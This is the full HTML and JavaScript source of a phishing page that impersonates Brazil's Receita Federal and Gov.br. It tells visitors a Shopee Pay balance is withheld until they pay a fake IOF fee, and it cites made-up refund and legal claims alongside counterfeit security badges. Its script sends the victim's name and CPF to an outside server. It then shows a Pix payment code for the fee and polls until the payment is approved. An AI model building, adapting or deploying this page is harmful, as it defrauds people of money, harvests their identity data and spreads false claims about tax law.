<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pagamento de Tributos - Gov.br</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --gov-blue: #0038a9;   /* Azul Receita */
            --gov-dark: #00236b;   /* Azul Escuro */
            --success: #138a41;    /* Verde Gov */
            --bg-gray: #f8f9fa;
            --text-main: #333;
            --border-color: #e0e0e0;
        }

        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-gray);
            margin: 0; padding: 0;
            color: var(--text-main);
            min-height: 100vh;
            display: flex; flex-direction: column;
        }

        /* --- HEADER OFICIAL --- */
        .gov-header {
            background-color: var(--gov-blue);
            width: 100%;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
            position: sticky; top: 0; z-index: 100;
        }
        
        /* Cadeado SVG Perfeito */
        .lock-icon { width: 20px; height: 20px; fill: white; margin-right: 10px; }
        
        .header-title {
            color: white;
            font-weight: 700;
            font-size: 16px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        /* --- CONTE√öDO PRINCIPAL --- */
        .container {
            flex: 1;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
            width: 100%;
        }

        /* T√≠tulo Hero */
        .page-title { text-align: center; margin-bottom: 25px; }
        .page-title h1 { font-size: 20px; color: var(--gov-dark); margin: 0 0 5px 0; font-weight: 700; }
        .page-title p { font-size: 13px; color: #666; margin: 0; }

        /* Card de Resumo */
        .card-summary {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            border: 1px solid var(--border-color);
            margin-bottom: 20px;
        }

        .row-detail { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; color: #555; }
        .row-detail.total {
            margin-top: 15px; padding-top: 15px;
            border-top: 1px dashed var(--border-color);
            align-items: center;
        }
        .text-taxa { color: #d32f2f; font-weight: 600; }
        .text-total-label { font-weight: 700; color: var(--gov-dark); }
        .text-total-value { font-size: 22px; font-weight: 800; color: var(--success); }

        /* Aviso Reembolso */
        .notice-box {
            background: #e3f2fd;
            border-left: 4px solid #1976d2;
            padding: 12px 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #0d47a1;
            line-height: 1.4;
        }

        /* Inputs */
        .input-group { margin-bottom: 15px; }
        .input-field {
            width: 100%; padding: 16px;
            border: 1px solid #ccc; border-radius: 6px;
            font-size: 16px; transition: 0.3s;
        }
        .input-field:focus { border-color: var(--gov-blue); box-shadow: 0 0 0 2px rgba(0,56,169,0.1); }

        /* Bot√£o */
        .btn-pay {
            width: 100%; padding: 18px;
            background: var(--success);
            color: white; border: none; border-radius: 6px;
            font-size: 16px; font-weight: 700;
            cursor: pointer; text-transform: uppercase;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
            display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .btn-pay:hover { filter: brightness(0.95); }

        /* --- √ÅREA DE CONFIAN√áA (Rodap√© Robusto) --- */
        .trust-section {
            margin-top: 30px;
            border-top: 1px solid #e0e0e0;
            padding-top: 20px;
        }

        .trust-header {
            display: flex; align-items: center; gap: 10px;
            margin-bottom: 15px;
        }
        .shield-icon { width: 18px; height: 18px; fill: #666; }
        .trust-title { font-size: 12px; font-weight: 700; color: #555; text-transform: uppercase; }

        .trust-info {
            font-size: 11px; color: #777; line-height: 1.6; text-align: justify;
            margin-bottom: 15px;
        }

        .security-badges {
            display: flex; gap: 15px; margin-bottom: 20px;
        }
        .badge {
            background: #fff; border: 1px solid #ddd;
            border-radius: 4px; padding: 5px 10px;
            font-size: 10px; font-weight: 600; color: #555;
            display: flex; align-items: center; gap: 5px;
        }
        .badge::before { content: 'üîí'; }

        .official-footer {
            text-align: center; margin-top: 30px; opacity: 0.7;
        }
        .gov-logo { height: 25px; }

        /* --- MODAL QR CODE --- */
        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .qr-card { background: white; width: 100%; max-width: 350px; text-align: center; }
        .qr-img { width: 180px; margin: 15px auto; border: 1px solid #eee; border-radius: 8px; }
        .pix-code-box { background: #f5f5f5; padding: 12px; width: 100%; font-size: 11px; text-align: center; margin-bottom: 15px; border: 1px dashed #ccc; border-radius: 6px; color: #555; word-break: break-all; }

    </style>
</head>
<body>

    <div class="gov-header">
        <svg class="lock-icon" viewBox="0 0 24 24">
            <path d="M12 17a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6-9h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zM9 6a3 3 0 1 1 6 0v2H9V6z"/>
        </svg>
        <span class="header-title">Receita Federal</span>
    </div>

    <div class="container">
        
        <div class="page-title">
            <h1>Regulariza√ß√£o de Tributos</h1>
            <p>Guia de Recolhimento da Uni√£o (GRU)</p>
        </div>

        <div class="card-summary">
            <div class="row-detail"><span>Origem do Saldo</span><strong>Shopee Pay Institui√ß√£o de Pagamento</strong></div>
            <div class="row-detail"><span>Valor Retido</span><strong>R$ 1.489,38</strong></div>
            <div class="row-detail"><span>Tributo (IOF)</span><strong class="text-taxa">R$ 47,90</strong></div>
            
            <div class="row-detail total">
                <span class="text-total-label">Total a Pagar:</span>
                <span class="text-total-value">R$ 47,90</span>
            </div>
        </div>

        <div class="notice-box">
            <strong>Reembolso Autom√°tico (Lei n¬∫ 14.596):</strong> O valor do tributo √© estornado automaticamente para sua conta em at√© 2 minutos ap√≥s a valida√ß√£o da identidade.
        </div>
        
        <div class="input-group">
            <input type="text" id="nome" class="input-field" placeholder="Nome Completo do Contribuinte">
        </div>
        
        <div class="input-group">
            <input type="tel" id="cpf" class="input-field" placeholder="CPF" maxlength="14" oninput="mask(this)">
        </div>
        
        <button class="btn-pay" onclick="gerarPixIOF()">
            <svg style="width:20px;height:20px;fill:white" viewBox="0 0 24 24"><path d="M5 20h14v2H5v-2zm7-18l-1 1h-3v2H7v1H5v3h2v3h4v4h4v-4h4v-3h2V9h-2V8h-1V6h-3l-1-1z"/></svg>
            Pagar Taxa e Liberar
        </button>

        <div class="trust-section">
            <div class="trust-header">
                <svg class="shield-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                <span class="trust-title">Ambiente Seguro e Autenticado</span>
            </div>
            
            <p class="trust-info">
                Esta transa√ß√£o √© processada em ambiente criptografado de ponta a ponta (SSL 256-bit). A regulariza√ß√£o do Imposto sobre Opera√ß√µes Financeiras (IOF) √© obrigat√≥ria conforme Decreto n¬∫ 6.306/2007 para libera√ß√£o de cr√©ditos provenientes de plataformas digitais.
            </p>
            
            <div class="row-detail" style="font-size:11px; margin-bottom:5px;">
                <span>Protocolo de Seguran√ßa:</span>
                <strong>2026.8.038.991-RFB</strong>
            </div>
            
            <div class="security-badges">
                <div class="badge">Site Blindado</div>
                <div class="badge">Google Safe Browsing</div>
                <div class="badge">Banco Central</div>
            </div>

            <div class="official-footer">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="gov-logo" style="opacity:0.6">
                <div style="font-size:10px; color:#999; margin-top:10px;">
                    Minist√©rio da Economia ‚Ä¢ Secretaria Especial da Receita Federal<br>
                    Bras√≠lia - DF ‚Ä¢ CNPJ: 00.394.460/0001-41
                </div>
            </div>
        </div>

    </div>

    <div id="qr-screen">
        <div class="qr-card">
            <h3 style="color:var(--gov-dark); margin-bottom:5px;">Pagamento via Pix</h3>
            <p style="font-size:13px; color:#666;">Copie o c√≥digo abaixo e pague no seu banco.</p>
            
            <img id="qr-image" class="qr-img">
            
            <div style="font-size:11px; font-weight:bold; margin-bottom:5px; text-align:left;">Pix Copia e Cola:</div>
            <textarea id="pix-copia" class="pix-code-box" readonly></textarea>
            
            <button class="btn-pay" onclick="copiarCodigo()">Copiar C√≥digo Pix</button>
            
            <div id="msg-sucesso" style="margin-top:15px;color:var(--success);display:none;font-weight:bold;text-align:center;">
                PAGAMENTO CONFIRMADO!
            </div>
        </div>
    </div>

    <script>
        const API_URL = "https://checkout-pix-profissional.onrender.com";
        function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
        
        async function gerarPixIOF() {
            const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-pay');
            if(n.length<3||c.length<11) return alert("Preencha todos os dados.");
            
            b.innerHTML = "Processando..."; b.disabled=true; b.style.opacity = "0.7";
            
            try {
                // VALOR DA TAXA (Configur√°vel aqui se quiser mudar para 37.90 ou manter 47.90)
                const r=await fetch(`${API_URL}/pix`,{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({amount:47.90,name:n,cpf:c})
                });
                const d=await r.json();
                
                if(d.point_of_interaction){
                    document.getElementById('qr-image').src=`data:image/png;base64,${d.point_of_interaction.transaction_data.qr_code_base64}`;
                    document.getElementById('pix-copia').value = d.point_of_interaction.transaction_data.qr_code;
                    document.getElementById('qr-screen').style.display='flex';
                    monitor(d.id);
                } else { alert("Erro ao gerar Pix."); b.disabled=false; b.innerHTML="Pagar Taxa e Liberar"; }
            } catch(e){ alert("Erro de conex√£o."); b.disabled=false; b.innerHTML="Pagar Taxa e Liberar"; }
        }

        function monitor(id){ 
            const i=setInterval(async()=>{ 
                try{ 
                    const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); 
                    if(j.status==='approved'){ clearInterval(i); document.getElementById('msg-sucesso').style.display='block'; } 
                }catch(e){} 
            },3000); 
        }

        function copiarCodigo(){ 
            const t=document.getElementById('pix-copia'); t.select(); t.setSelectionRange(0,99999); 
            document.execCommand('copy'); alert("C√≥digo copiado!"); 
        }
    </script>
</body>
</html>